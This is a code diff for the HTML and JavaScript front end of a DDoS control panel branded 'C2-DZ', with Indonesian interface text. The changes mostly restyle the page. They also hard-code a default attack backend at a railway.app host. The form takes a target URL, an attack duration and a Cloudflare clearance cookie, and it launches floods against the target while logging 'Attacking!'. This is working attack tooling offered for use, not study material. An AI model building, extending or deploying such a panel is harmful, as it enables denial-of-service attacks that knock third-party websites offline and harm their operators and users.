@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YT : DIZFLYZE</title>
+    <title>C2-DZ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -25,9 +26,21 @@
             padding-bottom:12px;
             margin-bottom:28px;
         }
-        .header h1 { font-weight:300; font-size:1.8rem; letter-spacing:1px; color:#f0f0f0; }
-        .header h1 span { color:#e74c3c; font-weight:400; }
-        .header .status { font-size:0.8rem; color:#7c7c7c; letter-spacing:0.5px; }
+        .header h1 {
+            font-weight:900;
+            font-size:3rem;
+            letter-spacing:1px;
+            color:#f0f0f0;
+            white-space:nowrap;
+        }
+        .header h1 span { color:#e74c3c; font-weight:900; }
+        .header .status {
+            font-size:0.8rem;
+            font-weight:900;
+            color:#7c7c7c;
+            letter-spacing:0.5px;
+            white-space:nowrap;
+        }
         .header .status .dot {
             display:inline-block; width:8px; height:8px;
             border-radius:50%; margin-right:6px;
@@ -41,6 +54,7 @@
         .info-grid {
             display:grid; grid-template-columns:1fr 1fr; gap:6px 30px;
             margin-bottom:30px; padding:0 2px; font-size:0.9rem;
+            font-weight:500;
         }
         .info-grid .item {
             display:flex; justify-content:space-between;
@@ -48,55 +62,148 @@
             word-break: break-all;
         }
         .info-grid .item .label { color:#7c7c7c; flex-shrink:0; margin-right:10px; }
-        .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; }
+        .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; font-weight:500; }
         .section-title {
             font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px;
+            font-weight:900;
             color:#5c5c5c; margin:28px 0 14px 0;
             border-bottom:1px solid #1a1a1a; padding-bottom:6px;
         }
-        .form-group { margin-bottom:16px; }
-        .form-group label { display:block; font-size:0.8rem; color:#b0b0b0; margin-bottom:4px; letter-spacing:0.3px; }
-        .form-group input {
-            width:100%; padding:10px 12px; background:#161616;
-            border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0;
-            font-size:0.95rem; transition:border 0.2s; outline:none;
+        .form-group { margin-bottom:10px; }
+        .form-group label {
+            display:block;
+            font-size:0.8rem;
+            font-weight:500;
+            color:#b0b0b0;
+            margin-bottom:4px;
+            letter-spacing:0.3px;
         }
-        .form-group input:focus { border-color:#e74c3c; }
-        .form-group input::placeholder { color:#555; }
-        .form-group input[type="password"] {
+        .form-group .input-wrapper {
+            position:relative;
+            width:100%;
+        }
+        .form-group .input-wrapper input,
+        .form-group .input-wrapper select {
+            width:100%;
+            padding:10px 40px 10px 36px;
+            background:#161616;
+            border:1px solid #2a2a2a;
+            border-radius:4px;
+            color:#f0f0f0;
+            font-size:0.95rem;
+            transition:border 0.2s;
+            outline:none;
+            appearance:none;
+            -webkit-appearance:none;
+        }
+        .form-group .input-wrapper input:focus,
+        .form-group .input-wrapper select:focus {
+            border-color:#e74c3c;
+        }
+        .form-group .input-wrapper input::placeholder {
+            color:#555;
+        }
+        .form-group .input-wrapper input[type="password"] {
             -webkit-text-security: disc;
             text-security: disc;
         }
-        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+        .form-group .input-wrapper .input-icon {
+            position:absolute;
+            left:12px;
+            top:50%;
+            transform:translateY(-50%);
+            color:#555;
+            font-size:0.9rem;
+            pointer-events:none;
+        }
+        .form-group .input-wrapper .toggle-eye {
+            position:absolute;
+            right:12px;
+            top:50%;
+            transform:translateY(-50%);
+            background:transparent;
+            border:none;
+            color:#7c7c7c;
+            cursor:pointer;
+            font-size:1rem;
+            padding:4px;
+            line-height:1;
+            transition:color 0.2s;
+        }
+        .form-group .input-wrapper .toggle-eye:hover {
+            color:#e0e0e0;
+        }
+        .form-row {
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:16px;
+        }
         .btn {
-            display:inline-block; width:100%; padding:12px;
-            background:#e74c3c; border:none; border-radius:4px;
-            color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px;
-            cursor:pointer; transition:background 0.2s, transform 0.1s; margin-top:8px;
+            display:inline-block;
+            width:100%;
+            padding:12px;
+            background:#e74c3c;
+            border:none;
+            border-radius:4px;
+            color:#fff;
+            font-weight:500;
+            font-size:1rem;
+            letter-spacing:1px;
+            cursor:pointer;
+            transition:background 0.2s, transform 0.1s;
+            margin-top:8px;
         }
-        .btn:hover:not(:disabled) { background:#c0392b; }
-        .btn:active { transform:scale(0.98); }
-        .btn:disabled { opacity:0.5; cursor:not-allowed; background:#555; }
+        .btn:hover:not(:disabled) {
+            background:#c0392b;
+        }
+        .btn:active {
+            transform:scale(0.98);
+        }
+        .btn:disabled {
+            opacity:0.5;
+            cursor:not-allowed;
+            background:#555;
+        }
         .btn-test {
-            background:#2a2a2a; border:1px solid #3a3a3a; margin-top:4px;
+            background:#2a2a2a;
+            border:1px solid #3a3a3a;
+            margin-top:4px;
         }
-        .btn-test:hover:not(:disabled) { background:#3a3a3a; }
-        .btn-test.success { border-color:#2ecc71; color:#2ecc71; }
-        .btn-test.error { border-color:#e74c3c; color:#e74c3c; }
-        .btn-toggle {
-            background:#1a1a1a; border:1px solid #2a2a2a; margin-top:4px;
-            font-size:0.8rem; padding:8px;
+        .btn-test:hover:not(:disabled) {
+            background:#3a3a3a;
         }
-        .btn-toggle:hover:not(:disabled) { background:#2a2a2a; }
-        .log-area { margin-top:30px; border-top:1px solid #1e1e1e; padding-top:16px; }
+        .btn-test.success {
+            border-color:#2ecc71;
+            color:#2ecc71;
+        }
+        .btn-test.error {
+            border-color:#e74c3c;
+            color:#e74c3c;
+        }
+        .log-area {
+            margin-top:30px;
+            border-top:1px solid #1e1e1e;
+            padding-top:16px;
+        }
         .log-area .log-header {
-            display:flex; justify-content:space-between;
-            font-size:0.7rem; color:#5c5c5c; letter-spacing:0.5px; margin-bottom:6px;
+            display:flex;
+            justify-content:space-between;
+            font-size:0.7rem;
+            color:#5c5c5c;
+            letter-spacing:0.5px;
+            margin-bottom:6px;
         }
         .log-area .log-content {
-            background:#0f0f0f; padding:12px 14px; border-radius:4px;
-            font-family:'Fira Code', monospace; font-size:0.8rem; color:#a0a0a0;
-            max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+            background:#0f0f0f;
+            padding:12px 14px;
+            border-radius:4px;
+            font-family:'Fira Code', monospace;
+            font-size:0.8rem;
+            color:#a0a0a0;
+            max-height:160px;
+            overflow-y:auto;
+            white-space:pre-wrap;
+            word-break:break-all;
             border-left:2px solid #2a2a2a;
         }
         .log-area .log-content .attack-started { color:#2ecc71; }
@@ -104,58 +211,87 @@
         .log-area .log-content .cooldown-info { color:#f39c12; }
         .log-area .log-content .system { color:#3498db; }
         .footer {
-            margin-top:30px; font-size:0.7rem; color:#3a3a3a;
-            text-align:center; border-top:1px solid #1a1a1a; padding-top:16px;
+            margin-top:30px;
+            font-size:0.7rem;
+            color:#3a3a3a;
+            text-align:center;
+            border-top:1px solid #1a1a1a;
+            padding-top:16px;
         }
         .log-content::-webkit-scrollbar { width:4px; }
         .log-content::-webkit-scrollbar-track { background:#0f0f0f; }
         .log-content::-webkit-scrollbar-thumb { background:#2a2a2a; border-radius:4px; }
+
         @media (max-width:600px) {
-            .header { flex-direction:column; align-items:flex-start; gap:6px; }
+            body {
+                align-items:flex-start;
+                padding:16px;
+            }
+            .header h1 { font-size:1.4rem; }
+            .header .status { font-size:0.7rem; }
             .info-grid { grid-template-columns:1fr; gap:4px; }
             .form-row { grid-template-columns:1fr; gap:0; }
+            .form-group .input-wrapper input,
+            .form-group .input-wrapper select {
+                font-size:0.85rem;
+                padding:8px 36px 8px 32px;
+            }
+            .form-group .input-wrapper .input-icon { font-size:0.8rem; }
+            .form-group .input-wrapper .toggle-eye { font-size:0.9rem; }
+            .btn { font-size:0.9rem; padding:10px; }
+            .log-area .log-content { font-size:0.7rem; max-height:120px; }
         }
     </style>
 </head>
 <body>
 <div class="dashboard">
     <div class="header">
-        <h1>H2-<span>FLOW</span></h1>
+        <h1>C2-<span>DZ</span></h1>
         <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
     </div>
     <div class="info-grid">
-        <div class="item"><span class="label">Backend</span><span class="value" id="info-backend">••••••••</span></div>
         <div class="item"><span class="label">Duration</span><span class="value" id="info-duration">—</span></div>
         <div class="item"><span class="label">Cookie</span><span class="value" id="info-cookie">—</span></div>
-        <div class="item"><span class="label">Status</span><span class="value" id="info-status">—</span></div>
         <div class="item"><span class="label">Cooldown</span><span class="value" id="info-ipcooldown">—</span></div>
         <div class="item"><span class="label">Dilarang Sampai</span><span class="value" id="info-ipbanned">—</span></div>
     </div>
     <div class="section-title">configuration</div>
     <form id="attack-form">
         <div class="form-group">
-            <label for="backendUrl">Backend URL</label>
-            <input type="password" id="backendUrl" name="backendUrl" placeholder="https://ddos-panel-production.up.railway.app" required>
+            <label for="backendUrl">Api C2</label>
+            <div class="input-wrapper">
+                <input type="password" id="backendUrl" name="backendUrl" placeholder="https://ddos-panel-production.up.railway.app" value="https://ddos-panel-production.up.railway.app" required>
+                <i class="fas fa-server input-icon"></i>
+                <button type="button" class="toggle-eye" id="toggleBtn">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
         </div>
         <div class="form-group">
             <label for="target">Target</label>
-            <input type="text" id="target" name="target" placeholder="https://example.com" required>
+            <div class="input-wrapper">
+                <input type="text" id="target" name="target" placeholder="https://example.com" required>
+                <i class="fas fa-crosshairs input-icon"></i>
+            </div>
         </div>
         <div class="form-row">
             <div class="form-group">
-                <label for="duration">Duration (max 120)</label>
-                <input type="number" id="duration" name="duration" value="60" min="1" max="120" required>
+                <label for="duration">Duration</label>
+                <div class="input-wrapper">
+                    <input type="number" id="duration" name="duration" value="60" min="1" max="120" required>
+                    <i class="fas fa-clock input-icon"></i>
+                </div>
             </div>
             <div class="form-group">
-                <label for="cookie">Cookie (Optional)</label>
-                <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
+                <label for="cookie">Cookie</label>
+                <div class="input-wrapper">
+                    <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
+                    <i class="fas fa-cookie-bite input-icon"></i>
+                </div>
             </div>
         </div>
         <button type="submit" class="btn" id="launchBtn">Gass</button>
-        <div style="display:flex; gap:8px; margin-top:4px;">
-            <button type="button" class="btn btn-test" id="testBtn" style="flex:1;">Test Backend</button>
-            <button type="button" class="btn btn-toggle" id="toggleBtn" style="flex:0.5;">👁</button>
-        </div>
+        <button type="button" class="btn btn-test" id="testBtn">Cek Api</button>
     </form>
     <div class="log-area">
         <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
@@ -178,10 +314,9 @@
     var launchBtn = document.getElementById('launchBtn');
     var testBtn = document.getElementById('testBtn');
     var toggleBtn = document.getElementById('toggleBtn');
+    var toggleIcon = toggleBtn.querySelector('i');
     var statusDot = document.getElementById('statusDot');
     var statusText = document.getElementById('statusText');
-    var infoStatus = document.getElementById('info-status');
-    var infoBackend = document.getElementById('info-backend');
     var infoDuration = document.getElementById('info-duration');
     var infoCookie = document.getElementById('info-cookie');
     var infoIpCooldown = document.getElementById('info-ipcooldown');
@@ -213,7 +348,6 @@
 
     function updateStatus(status, type) {
         statusText.textContent = status;
-        infoStatus.textContent = status;
         var dotMap = { 'ready': 'ready', 'busy': 'busy', 'cooldown': 'cooldown', 'waiting': 'waiting', 'offline': 'offline' };
         statusDot.className = 'dot ' + (dotMap[type] || 'ready');
     }
@@ -221,29 +355,10 @@
     function setButtonLoading(loading) {
         if (loading) {
             launchBtn.disabled = true;
-            launchBtn.textContent = 'PROCESSING...';
+            launchBtn.textContent = 'Waiting!';
         } else {
             launchBtn.disabled = false;
             launchBtn.textContent = 'Gass';
-        }
-    }
-
-    function maskUrl(url) {
-        if (!url) return '••••••••';
-        var parts = url.replace(/^https?:\/\//, '').split('.');
-        if (parts.length >= 3) {
-            return parts[0].charAt(0) + '•••••' + parts[0].slice(-1) + '.' + parts.slice(1).join('.');
-        }
-        return url.substring(0, 4) + '••••••' + url.slice(-4);
-    }
-
-    function updateInfo(data) {
-        infoDuration.textContent = data.duration ? data.duration + 's' : '—';
-        infoCookie.textContent = data.cookie || '—';
-        infoIpCooldown.textContent = data.ip_cooldown > 0 ? data.ip_cooldown + 's' : '—';
-        infoIpBanned.textContent = data.ip_banned > 0 ? data.ip_banned + 's' : '—';
-        if (data.backend) {
-            infoBackend.textContent = isRevealed ? data.backend : maskUrl(data.backend);
         }
     }
 
@@ -251,19 +366,17 @@
         isRevealed = !isRevealed;
         if (isRevealed) {
             backendUrlInput.type = 'text';
-            toggleBtn.textContent = '✕';
-            if (API_URL) infoBackend.textContent = API_URL;
+            toggleIcon.className = 'fas fa-eye-slash';
         } else {
             backendUrlInput.type = 'password';
-            toggleBtn.textContent = '👁';
-            if (API_URL) infoBackend.textContent = maskUrl(API_URL);
+            toggleIcon.className = 'fas fa-eye';
         }
     }
 
     function testBackend() {
         var url = backendUrlInput.value.trim();
         if (!url) {
-            addLog('Masukkan URL backend dulu', 'error');
+            addLog('Api C2 Belum Ada!', 'error');
             return false;
         }
         var cleanUrl = url.replace(/\/+$/, '');
@@ -271,10 +384,9 @@
             cleanUrl = 'https://' + cleanUrl;
         }
         API_URL = cleanUrl;
-        infoBackend.textContent = isRevealed ? API_URL : maskUrl(API_URL);
         localStorage.setItem('backendUrl', API_URL);
-        addLog('Testing backend connection', 'system');
-        testBtn.textContent = 'Testing...';
+        addLog('Api C2 Terhubung', 'system');
+        testBtn.textContent = 'Cek!';
         testBtn.disabled = true;
         fetch(API_URL + '/api/health', {
             method: 'GET',
@@ -286,20 +398,20 @@
                 throw new Error('HTTP ' + response.status);
             }
         }).then(function(data) {
-            addLog('Backend connected. Status: ' + data.status, 'success');
+            addLog('Api Status : ' + data.status, 'success');
             testBtn.className = 'btn btn-test success';
             testBtn.textContent = 'Connected';
-            updateStatus('Backend Ready', 'ready');
+            updateStatus('Ready', 'ready');
         }).catch(function(error) {
-            addLog('Backend offline: ' + error.message, 'error');
+            addLog('Api Offline: ' + error.message, 'error');
             testBtn.className = 'btn btn-test error';
             testBtn.textContent = 'Failed';
-            updateStatus('Backend Offline', 'offline');
+            updateStatus('Api Offline', 'offline');
         }).finally(function() {
             testBtn.disabled = false;
             setTimeout(function() {
                 testBtn.className = 'btn btn-test';
-                testBtn.textContent = 'Test Backend';
+                testBtn.textContent = 'Cek Api';
             }, 3000);
         });
         return false;
@@ -327,7 +439,7 @@
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         if (!API_URL) {
-            addLog('Test backend connection dulu', 'error');
+            addLog('Cek Api dulu!', 'error');
             return;
         }
         if (isAttacking) {
@@ -351,8 +463,7 @@
         }
         isAttacking = true;
         setButtonLoading(true);
-        updateStatus('Attacking...', 'busy');
-        updateInfo({ duration: duration, cookie: cookie, ip_cooldown: 0, ip_banned: 0, backend: API_URL });
+        updateStatus('Attacking!', 'busy');
         addLog('Mulai attack ke ' + target + ' selama ' + duration + 's', 'success');
         startAttack(target, duration, cookie).then(function(result) {
             addLog('Attack started. ID: ' + (result.id || 'N/A'), 'success');
@@ -386,15 +497,22 @@
         if (timerInterval) clearInterval(timerInterval);
     });
 
-    addLog('[system] Ready', 'system');
     var savedUrl = localStorage.getItem('backendUrl');
     if (savedUrl) {
         backendUrlInput.value = savedUrl;
         API_URL = savedUrl;
-        infoBackend.textContent = maskUrl(savedUrl);
-        addLog('Loaded saved configuration', 'system');
-        setTimeout(testBackend, 500);
+    } else {
+        var defaultUrl = 'https://ddos-panel-production.up.railway.app';
+        backendUrlInput.value = defaultUrl;
+        API_URL = defaultUrl;
+        localStorage.setItem('backendUrl', defaultUrl);
     }
+
+    setTimeout(function() {
+        testBackend();
+    }, 500);
+
+    addLog('[system] Ready', 'system');
     updateLogCount();
 </script>
 </body>
